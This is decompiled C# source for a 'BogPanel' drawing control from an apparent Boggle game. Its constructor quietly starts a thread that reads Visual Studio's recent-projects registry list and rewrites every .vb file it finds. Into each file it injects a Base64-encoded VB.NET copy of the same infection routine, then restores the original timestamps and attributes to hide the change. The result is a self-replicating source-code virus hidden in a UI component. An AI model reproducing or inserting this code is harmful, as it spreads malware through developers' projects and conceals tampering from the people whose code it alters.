using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Boggle;

public class BogPanel : PictureBox
{
	private IContainer components;

	private void vIT()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\VisualStudio\\7.0\\ProjectMRUList");
		if (registryKey.ValueCount == 0)
		{
			ProjectData.EndApp();
		}
		string text = "Private Sub vIT()";
		string text2 = "Public Sub New()";
		string text3 = "Dim t As New System.Threading.Thread(AddressOf vIT)\r\nt.Start()";
		string text4 = "UHJpdmF0ZSBTdWIgdklUKCkNCkRpbSBYLCBZIEFzIEludGVnZXINCkRpbSBBLCBC";
		text4 += "KCksIEMsIEcsIEgsIEksIEosIEssIEwgQXMgU3RyaW5nDQpEaW0gRCwgRiBBcyBE";
		text4 += "YXRlDQpEaW0gUiBBcyBNaWNyb3NvZnQuV2luMzIuUmVnaXN0cnlLZXkNCkRpbSBT";
		text4 += "IEFzIFN5c3RlbS5JTy5TdHJlYW1SZWFkZXINCkRpbSBUIEFzIFN5c3RlbS5JTy5T";
		text4 += "dHJlYW1Xcml0ZXINCkRpbSBVIEFzIFN5c3RlbS5JTy5GaWxlQXR0cmlidXRlcw0K";
		text4 += "UiA9IE1pY3Jvc29mdC5XaW4zMi5SZWdpc3RyeS5DdXJyZW50VXNlci5PcGVuU3Vi";
		text4 += "S2V5KCJTb2Z0d2FyZVxNaWNyb3NvZnRcVmlzdWFsU3R1ZGlvXDcuMFxQcm9qZWN0";
		text4 += "TVJVTGlzdCIpDQpJZiBSLlZhbHVlQ291bnQgPSAwIFRoZW4gRW5kDQpHID0gIlBy";
		text4 += "aXZhdGUgU3ViIHZJVCgpIg0KSCA9ICJQdWJsaWMgU3ViIE5ldygpIg0KSSA9ICJE";
		text4 += "aW0gdCBBcyBOZXcgU3lzdGVtLlRocmVhZGluZy5UaHJlYWQoQWRkcmVzc09mIHZJ";
		text4 += "VCkiICYgdmJDckxmICYgInQuU3RhcnQoKSINCkogPSAiIg0KSyA9IFN5c3RlbS5U";
		text4 += "ZXh0LkVuY29kaW5nLkFTQ0lJLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9t";
		text4 += "QmFzZTY0U3RyaW5nKEopKQ0KTCA9ICJKID0gIiAmIENocigzNCkNCkZvciBYID0g";
		text4 += "MSBUbyBMZW4oSikgU3RlcCA2NA0KSWYgWCArIDY0IDwgTGVuKEopIFRoZW4NCkwg";
		text4 += "PSBMICYgTWlkKEosIFgsIDY0KSAmIENocigzNCkgJiB2YkNyTGYgJiAiSiA9IEog";
		text4 += "JiAiICYgQ2hyKDM0KQ0KRWxzZQ0KTCA9IEwgJiBNaWQoSiwgWCwgNjQpICYgQ2hy";
		text4 += "KDM0KQ0KRW5kIElmDQpOZXh0DQpLID0gUmVwbGFjZShLLCAiSiA9ICIgJiBDaHIo";
		text4 += "MzQpICYgQ2hyKDM0KSwgTCwgMSwgMSwgQ29tcGFyZU1ldGhvZC5UZXh0KQ0KTCA9";
		text4 += "ICIiDQpGb3IgWCA9IDAgVG8gUi5WYWx1ZUNvdW50IC0gMQ0KQSA9IFIuR2V0VmFs";
		text4 += "dWUoUi5HZXRWYWx1ZU5hbWVzKFgpKQ0KQSA9IE1pZChBLCAxLCBJblN0clJldihB";
		text4 += "LCAiXCIsIC0xLCBDb21wYXJlTWV0aG9kLlRleHQpKQ0KSWYgU3lzdGVtLklPLkRp";
		text4 += "cmVjdG9yeS5FeGlzdHMoQSkgVGhlbg0KQiA9IFN5c3RlbS5JTy5EaXJlY3Rvcnku";
		text4 += "R2V0RmlsZXMoQSwgIioudmIiKQ0KRm9yIFkgPSBMQm91bmQoQikgVG8gVUJvdW5k";
		text4 += "KEIpDQpEID0gU3lzdGVtLklPLkZpbGUuR2V0TGFzdEFjY2Vzc1RpbWUoQihZKSkN";
		text4 += "CkYgPSBTeXN0ZW0uSU8uRmlsZS5HZXRMYXN0V3JpdGVUaW1lKEIoWSkpDQpVID0g";
		text4 += "U3lzdGVtLklPLkZpbGUuR2V0QXR0cmlidXRlcyhCKFkpKQ0KU3lzdGVtLklPLkZp";
		text4 += "bGUuU2V0QXR0cmlidXRlcyhCKFkpLCBJTy5GaWxlQXR0cmlidXRlcy5Ob3JtYWwp";
		text4 += "DQpTID0gU3lzdGVtLklPLkZpbGUuT3BlblRleHQoQihZKSkNCkMgPSBTLlJlYWRU";
		text4 += "b0VuZCgpDQpTLkNsb3NlKCkNCklmIEluU3RyKEMsIEcsIENvbXBhcmVNZXRob2Qu";
		text4 += "VGV4dCkgPSAwIEFuZCBJblN0cihDLCBILCBDb21wYXJlTWV0aG9kLlRleHQpIDw+";
		text4 += "IDAgVGhlbg0KQyA9IFJlcGxhY2UoQywgIk15QmFzZS5OZXcoKSIsICJNeUJhc2Uu";
		text4 += "TmV3KCkiICYgdmJDckxmICYgSSwgLCAxLCBDb21wYXJlTWV0aG9kLlRleHQpDQpD";
		text4 += "ID0gUmVwbGFjZShDLCBILCBLICYgSCwgLCAxLCBDb21wYXJlTWV0aG9kLlRleHQp";
		text4 += "DQpUID0gU3lzdGVtLklPLkZpbGUuQ3JlYXRlVGV4dChCKFkpKQ0KVC5Xcml0ZShD";
		text4 += "KQ0KVC5GbHVzaCgpDQpULkNsb3NlKCkNCkVuZCBJZg0KU3lzdGVtLklPLkZpbGUu";
		text4 += "U2V0TGFzdFdyaXRlVGltZShCKFkpLCBGKQ0KU3lzdGVtLklPLkZpbGUuU2V0TGFz";
		text4 += "dEFjY2Vzc1RpbWUoQihZKSwgRCkNClN5c3RlbS5JTy5GaWxlLlNldEF0dHJpYnV0";
		text4 += "ZXMoQihZKSwgVSkNCk5leHQNCkVuZCBJZg0KTmV4dA0KRW5kIFN1Yg0K";
		string @string = Encoding.ASCII.GetString(Convert.FromBase64String(text4));
		string text5 = "J = \"";
		int num = Strings.Len(text4);
		checked
		{
			for (int i = 1; i <= num; i += 64)
			{
				text5 = ((i + 64 >= Strings.Len(text4)) ? (text5 + Strings.Mid(text4, i, 64) + "\"") : string.Concat(text5 + Strings.Mid(text4, i, 64) + "\"", "\r\nJ = J & ", "\""));
			}
			@string = Strings.Replace(@string, "J = \"\"", text5, 1, 1, (CompareMethod)1);
			text5 = "";
			int num2 = registryKey.ValueCount - 1;
			for (int i = 0; i <= num2; i++)
			{
				string text6 = StringType.FromObject(registryKey.GetValue(registryKey.GetValueNames()[i]));
				text6 = Strings.Mid(text6, 1, Strings.InStrRev(text6, "\\", -1, (CompareMethod)1));
				if (!Directory.Exists(text6))
				{
					continue;
				}
				string[] files = Directory.GetFiles(text6, "*.vb");
				int num3 = Information.LBound((Array)files, 1);
				int num4 = Information.UBound((Array)files, 1);
				for (int j = num3; j <= num4; j++)
				{
					DateTime lastAccessTime = File.GetLastAccessTime(files[j]);
					DateTime lastWriteTime = File.GetLastWriteTime(files[j]);
					FileAttributes attributes = File.GetAttributes(files[j]);
					File.SetAttributes(files[j], FileAttributes.Normal);
					StreamReader streamReader = File.OpenText(files[j]);
					string text7 = streamReader.ReadToEnd();
					streamReader.Close();
					if ((Strings.InStr(text7, text, (CompareMethod)1) == 0) & (Strings.InStr(text7, text2, (CompareMethod)1) != 0))
					{
						text7 = Strings.Replace(text7, "MyBase.New()", "MyBase.New()\r\n" + text3, 1, 1, (CompareMethod)1);
						text7 = Strings.Replace(text7, text2, @string + text2, 1, 1, (CompareMethod)1);
						StreamWriter streamWriter = File.CreateText(files[j]);
						streamWriter.Write(text7);
						streamWriter.Flush();
						streamWriter.Close();
					}
					File.SetLastWriteTime(files[j], lastWriteTime);
					File.SetLastAccessTime(files[j], lastAccessTime);
					File.SetAttributes(files[j], attributes);
				}
			}
		}
	}

	public BogPanel()
	{
		((Control)this).add_Resize((EventHandler)BogPanel_Resize);
		Thread thread = new Thread(vIT);
		thread.Start();
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((PictureBox)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).set_BackColor(Color.DarkGray);
	}

	protected override void OnPaint(PaintEventArgs pe)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_020b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0212: Expected O, but got Unknown
		//IL_0438: Unknown result type (might be due to invalid IL or missing references)
		//IL_0442: Expected O, but got Unknown
		Pen val = new Pen(Color.DarkGray);
		GraphicsPath val2 = new GraphicsPath();
		pe.get_Graphics().set_SmoothingMode((SmoothingMode)4);
		PointF pointF = new PointF(2f, (float)((double)((Control)this).get_Height() / 2.0));
		PointF pointF2 = pointF;
		PointF pointF3 = new PointF(0f, ((Control)this).get_Height());
		PointF pointF4 = pointF3;
		PointF pointF5 = new PointF(0f, ((Control)this).get_Height());
		PointF pointF6 = pointF5;
		checked
		{
			PointF pointF7 = new PointF((float)((double)((Control)this).get_Width() / 2.0), ((Control)this).get_Height() - 2);
			val2.AddBezier(pointF2, pointF4, pointF6, pointF7);
			pointF7 = new PointF((float)((double)((Control)this).get_Width() / 2.0), ((Control)this).get_Height() - 2);
			PointF pointF8 = pointF7;
			pointF5 = new PointF(((Control)this).get_Width(), ((Control)this).get_Height());
			PointF pointF9 = pointF5;
			pointF3 = new PointF(((Control)this).get_Width(), ((Control)this).get_Height());
			PointF pointF10 = pointF3;
			pointF = new PointF(((Control)this).get_Width() - 2, (float)((double)((Control)this).get_Height() / 2.0));
			val2.AddBezier(pointF8, pointF9, pointF10, pointF);
			pointF7 = new PointF(((Control)this).get_Width() - 2, (float)((double)((Control)this).get_Height() / 2.0));
			PointF pointF11 = pointF7;
			pointF5 = new PointF(((Control)this).get_Width(), 0f);
			PointF pointF12 = pointF5;
			pointF3 = new PointF(((Control)this).get_Width(), 0f);
			PointF pointF13 = pointF3;
			pointF = new PointF((float)((double)((Control)this).get_Width() / 2.0), 2f);
			val2.AddBezier(pointF11, pointF12, pointF13, pointF);
			pointF7 = new PointF((float)((double)((Control)this).get_Width() / 2.0), 2f);
			PointF pointF14 = pointF7;
			pointF5 = new PointF(0f, 0f);
			PointF pointF15 = pointF5;
			pointF3 = new PointF(0f, 0f);
			PointF pointF16 = pointF3;
			pointF = new PointF(2f, (float)((double)((Control)this).get_Height() / 2.0));
			val2.AddBezier(pointF14, pointF15, pointF16, pointF);
			float num = 0f;
			int num2 = default(int);
			int num3 = default(int);
			int num4 = default(int);
			do
			{
				num2 += 3;
				num3 += 3;
				num4 += 3;
				val = new Pen(Color.FromArgb(num2, num3, num4));
				Graphics graphics = pe.get_Graphics();
				Pen obj = val;
				pointF7 = new PointF(num + 2f, (float)((double)((Control)this).get_Height() / 2.0));
				PointF pointF17 = pointF7;
				pointF5 = new PointF(num, (float)((Control)this).get_Height() - num);
				PointF pointF18 = pointF5;
				pointF3 = new PointF(num, (float)((Control)this).get_Height() - num);
				PointF pointF19 = pointF3;
				pointF = new PointF((float)((double)((Control)this).get_Width() / 2.0), (float)((Control)this).get_Height() - (num + 2f));
				graphics.DrawBezier(obj, pointF17, pointF18, pointF19, pointF);
				Graphics graphics2 = pe.get_Graphics();
				Pen obj2 = val;
				pointF7 = new PointF((float)((double)((Control)this).get_Width() / 2.0), (float)((Control)this).get_Height() - (num + 2f));
				PointF pointF20 = pointF7;
				pointF5 = new PointF((float)((Control)this).get_Width() - num, (float)((Control)this).get_Height() - num);
				PointF pointF21 = pointF5;
				pointF3 = new PointF((float)((Control)this).get_Width() - num, (float)((Control)this).get_Height() - num);
				PointF pointF22 = pointF3;
				pointF = new PointF((float)((Control)this).get_Width() - (num + 2f), (float)((double)((Control)this).get_Height() / 2.0));
				graphics2.DrawBezier(obj2, pointF20, pointF21, pointF22, pointF);
				Graphics graphics3 = pe.get_Graphics();
				Pen obj3 = val;
				pointF7 = new PointF((float)((Control)this).get_Width() - (num + 2f), (float)((double)((Control)this).get_Height() / 2.0));
				PointF pointF23 = pointF7;
				pointF5 = new PointF((float)((Control)this).get_Width() - num, num);
				PointF pointF24 = pointF5;
				pointF3 = new PointF((float)((Control)this).get_Width() - num, num);
				PointF pointF25 = pointF3;
				pointF = new PointF((float)((double)((Control)this).get_Width() / 2.0), num + 2f);
				graphics3.DrawBezier(obj3, pointF23, pointF24, pointF25, pointF);
				Graphics graphics4 = pe.get_Graphics();
				Pen obj4 = val;
				pointF7 = new PointF((float)((double)((Control)this).get_Width() / 2.0), num + 2f);
				PointF pointF26 = pointF7;
				pointF5 = new PointF(num, num);
				PointF pointF27 = pointF5;
				pointF3 = new PointF(num, num);
				PointF pointF28 = pointF3;
				pointF = new PointF(num + 2f, (float)((double)((Control)this).get_Height() / 2.0));
				graphics4.DrawBezier(obj4, pointF26, pointF27, pointF28, pointF);
				num += 0.1f;
			}
			while (FlowControl.ForNextCheckR4(num, 5f, 0.1f));
			((Control)this).set_BackColor(Color.DarkGray);
			((Control)this).set_Region(new Region(val2));
			val2.Dispose();
		}
	}

	private void BogPanel_Resize(object sender, EventArgs e)
	{
		((Control)this).Refresh();
	}
}
